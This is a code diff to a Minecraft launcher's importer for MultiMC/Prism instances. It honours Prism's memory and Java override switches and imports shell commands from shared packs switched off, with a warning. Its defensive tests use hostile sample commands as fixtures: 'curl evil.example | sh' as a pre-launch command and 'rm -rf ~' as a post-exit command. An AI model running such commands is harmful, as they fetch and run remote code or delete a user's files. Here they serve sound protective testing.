@@ -283,6 +283,13 @@ pub struct InstanceConfig {
     pub pre_launch_command: Option<String>,
     pub post_exit_command: Option<String>,
     pub wrapper_command: Option<String>,
+    /// Prism's switches that say the instance's own memory, Java arguments and Java location are used (`None` when
+    /// the file doesn't say, as in older exports: then they are used as before).
+    pub override_memory: Option<bool>,
+    pub override_java_args: Option<bool>,
+    pub override_java_location: Option<bool>,
+    /// The instance lets Prism pick the Java (its `JavaPath` is then only the last one it used).
+    pub automatic_java: Option<bool>,
 }
 
 impl InstanceConfig {
@@ -300,7 +307,20 @@ impl InstanceConfig {
             pre_launch_command: text(&["PreLaunchCommand"]),
             post_exit_command: text(&["PostExitCommand"]),
             wrapper_command: text(&["WrapperCommand"]),
+            override_memory: flag(p, "OverrideMemory"),
+            override_java_args: flag(p, "OverrideJavaArgs"),
+            override_java_location: flag(p, "OverrideJavaLocation"),
+            automatic_java: flag(p, "AutomaticJava"),
         }
+    }
+}
+
+/// A `true`/`false` setting, `None` when it isn't there or is something else.
+fn flag(p: &Properties, key: &str) -> Option<bool> {
+    match p.get(key)?.trim() {
+        v if v.eq_ignore_ascii_case("true") => Some(true),
+        v if v.eq_ignore_ascii_case("false") => Some(false),
+        _ => None,
     }
 }
 
@@ -484,33 +504,8 @@ async fn finish_import(
     instance.set_mod_records(&records);
 
     // settings from instance.cfg
-    let cfg = &mmc.config;
+    apply_config(&mut instance.file.launcher, &mmc.config, name);
     let l = &mut instance.file.launcher;
-    l.name = name.to_string();
-    l.pack = name.to_string();
-    l.description = String::new();
-    l.version = "1".into();
-    l.vanilla_instance = false;
-    if let Some(cmd) = usable(&cfg.pre_launch_command) {
-        l.extras.insert("preLaunchCommand".into(), json!(cmd));
-        l.extras.insert("enableCommands".into(), json!(true));
-    }
-    if let Some(cmd) = usable(&cfg.post_exit_command) {
-        l.extras.insert("postExitCommand".into(), json!(cmd));
-        l.extras.insert("enableCommands".into(), json!(true));
-    }
-    if let Some(cmd) = usable(&cfg.wrapper_command) {
-        l.wrapper_command = Some(cmd);
-        l.extras.insert("enableCommands".into(), json!(true));
-    }
-    if let Some(p) = usable(&cfg.java_path) {
-        l.java_path = Some(java_home_from(&p));
-    }
-    if let Some(a) = usable(&cfg.java_arguments) {
-        l.java_arguments = Some(a);
-    }
-    l.perm_gen = cfg.perm_gen;
-    l.maximum_memory = cfg.maximum_memory;
     // the manifest is kept, like the Java edition does (the config is not part of it)
     l.extras.insert("multiMCManifest".into(), serde_json::to_value(&mmc.manifest)?);
     for w in warnings {
@@ -578,6 +573,54 @@ pub fn read_archive_entry(archive: &Path, name: &str) -> Result<String> {
     let mut s = String::new();
     e.read_to_string(&mut s)?;
     Ok(s)
+}
+
+/// The settings of a MultiMC/Prism `instance.cfg` written into an instance's `launcher` block.
+fn apply_config(l: &mut crate::instances::LauncherBlock, cfg: &InstanceConfig, name: &str) {
+    l.name = name.to_string();
+    l.pack = name.to_string();
+    l.description = String::new();
+    l.version = "1".into();
+    l.vanilla_instance = false;
+    // commands run through the shell on every start: ones that came in a file (perhaps downloaded) are kept but
+    // switched off, so nothing runs until the player has seen them and switched them on in the instance's settings
+    let mut commands = Vec::new();
+    if let Some(cmd) = usable(&cfg.pre_launch_command) {
+        l.extras.insert("preLaunchCommand".into(), json!(cmd));
+        commands.push(cmd);
+    }
+    if let Some(cmd) = usable(&cfg.post_exit_command) {
+        l.extras.insert("postExitCommand".into(), json!(cmd));
+        commands.push(cmd);
+    }
+    if let Some(cmd) = usable(&cfg.wrapper_command) {
+        l.wrapper_command = Some(cmd.clone());
+        commands.push(cmd);
+    }
+    if !commands.is_empty() {
+        l.extras.insert("enableCommands".into(), json!(false));
+        crate::logs::warn(format!(
+            "The imported instance {name} has commands ({}); they were imported switched off. Instance settings > \
+             Commands switches them on.",
+            commands.join("; ")
+        ));
+    }
+    // the instance's own settings count only where it says it uses them, as Prism does
+    let used = |switch: Option<bool>| switch != Some(false);
+    if used(cfg.override_java_location) && cfg.automatic_java != Some(true) {
+        if let Some(p) = usable(&cfg.java_path) {
+            l.java_path = Some(java_home_from(&p));
+        }
+    }
+    if used(cfg.override_java_args) {
+        if let Some(a) = usable(&cfg.java_arguments) {
+            l.java_arguments = Some(a);
+        }
+    }
+    if used(cfg.override_memory) {
+        l.perm_gen = cfg.perm_gen;
+        l.maximum_memory = cfg.maximum_memory;
+    }
 }
 
 #[cfg(test)]
@@ -735,5 +778,54 @@ mod tests {
         let none = make("none.zip", &[("readme.txt", "hi")]);
         assert!(extract_export(&none, &tmp.join("out-none")).is_err());
         let _ = std::fs::remove_dir_all(&tmp);
+    }
+}
+
+#[cfg(test)]
+mod config_tests {
+    use super::*;
+
+    fn cfg(text: &str) -> InstanceConfig {
+        InstanceConfig::from_properties(&Properties::parse(text))
+    }
+
+    #[test]
+    fn commands_from_an_imported_instance_are_never_switched_on_by_themselves() {
+        let c = cfg(
+            "[General]\nOverrideCommands=true\nPreLaunchCommand=curl evil.example | sh\nWrapperCommand=gamemoderun\nPostExitCommand=rm -rf ~\n",
+        );
+        let mut l = crate::instances::LauncherBlock::default();
+        apply_config(&mut l, &c, "Shared Pack");
+        assert_eq!(l.extras["enableCommands"], json!(false));
+        assert_eq!(l.extras["preLaunchCommand"], json!("curl evil.example | sh"), "kept, so the player can see it");
+        assert_eq!(l.wrapper_command.as_deref(), Some("gamemoderun"));
+        // no commands: nothing about commands is written
+        let mut l = crate::instances::LauncherBlock::default();
+        apply_config(&mut l, &cfg("[General]\nPreLaunchCommand=null\n"), "x");
+        assert!(l.extras.get("enableCommands").is_none());
+    }
+
+    #[test]
+    fn prisms_override_switches_are_respected() {
+        let off = cfg(
+            "[General]\nOverrideMemory=false\nMaxMemAlloc=1024\nOverrideJavaArgs=false\nJvmArgs=-Xss1M\nOverrideJavaLocation=false\nJavaPath=/opt/java/bin/java\n",
+        );
+        let mut l = crate::instances::LauncherBlock::default();
+        apply_config(&mut l, &off, "x");
+        assert_eq!(l.maximum_memory, None, "the launcher's own memory setting is used");
+        assert_eq!(l.java_arguments, None);
+        assert_eq!(l.java_path, None);
+        // automatic Java: the path is only the last one Prism used, often from another computer
+        let auto =
+            cfg("[General]\nAutomaticJava=true\nJavaPath=/usr/lib/jvm/java-21/bin/java\nOverrideJavaLocation=true\n");
+        let mut l = crate::instances::LauncherBlock::default();
+        apply_config(&mut l, &auto, "x");
+        assert_eq!(l.java_path, None);
+        // older exports without the switches keep working as before
+        let old = cfg("[General]\nMaxMemAlloc=6144\nJVMArgs=-Dfoo=bar\n");
+        let mut l = crate::instances::LauncherBlock::default();
+        apply_config(&mut l, &old, "x");
+        assert_eq!(l.maximum_memory, Some(6144));
+        assert_eq!(l.java_arguments.as_deref(), Some("-Dfoo=bar"));
     }
 }
